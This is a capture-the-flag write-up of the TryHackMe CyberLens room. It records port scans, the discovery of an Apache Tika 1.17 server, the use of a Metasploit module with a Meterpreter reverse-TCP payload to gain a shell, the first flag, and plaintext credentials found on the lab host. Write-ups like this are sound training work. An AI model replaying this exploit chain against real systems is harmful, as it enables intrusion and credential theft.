Platform: TryHackMe
Room: CyberLens
URL: https://tryhackme.com/r/room/cyberlensp6
Date: June 5, 2024

# Notes
10:21 am
Loaded target machine
IP 10.10.234.94

added cyberlens.thm to hosts file (mentioned in the room description)
![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/dc1950a7-8a20-4dab-9752-f0bb18e66d02)

Fast NMAP scan of target. `nmap -F cyberlens.thm`\
Found ports 80,135,139,445,3389

rustscan of target. `rustscan -a 10.10.234.94\
Found ports 80,135,139,3389,445,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671,61777

Running nmap service scan of all open ports `nmap -sV -p80,135,139,3389,445,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671,61777 cyberlens.thm`
OUTPUT:
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
```
Found HTTP servers on ports 80,5985,47001,61777

Opened firefox browser and burpsuite, proxying traffic

Navigated to http://cyberlens.thm

Identified file upload location
![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/7563d775-8fcf-4127-8504-b32fd9ccb44c)

clicked "browse" and selected a benign JPG. Clicked "GET Metadata"

Proxy shows a request made to `cyberlens.thm:61777/meta`

Navigated to https://cyberlens.thm:61777. It is running `Apache Tika 1.17 Server`
![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/9f653a6f-1c26-4b83-bae5-008279feb550)

Searched exploit-db for "Apache Tika 1.17, and found a metasploit exploit that seems compatible. (https://www.exploit-db.com/exploits/47208)

started msfconsole and searched for apache tika, and found the exploit module.

used module, and using default payload "windows/meterpreter/reverse_tcp"

set RHOSTS cyberlens.thm\
set RPORT 61777\
exploit

Exploit succeeded, established meterpreter shell
![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/0013ced4-53ce-40f4-b7a8-db7ea20e3059)

`shell` opened shell. `powershell` opened powershell shell

Navigated to C:\Users. Found 2 users, Administrator and CyberLens

Navigated to C:\Users\CyberLens\Desktop and found a file named "user.txt"

10:48 am
Obtained first flag\
![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/8c3cebbe-b8a0-4232-8f92-bfc673e59686)

Navigated to C:\Users\CyberLens\Documents\Management and found file `CyberLens-Management.txt`

File appears to contain credentials:
![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/6da3b7e0-1e1f-4a9c-a498-be60ac00cad9)

CyberLens
HackSmarter123

Checked MSI policies
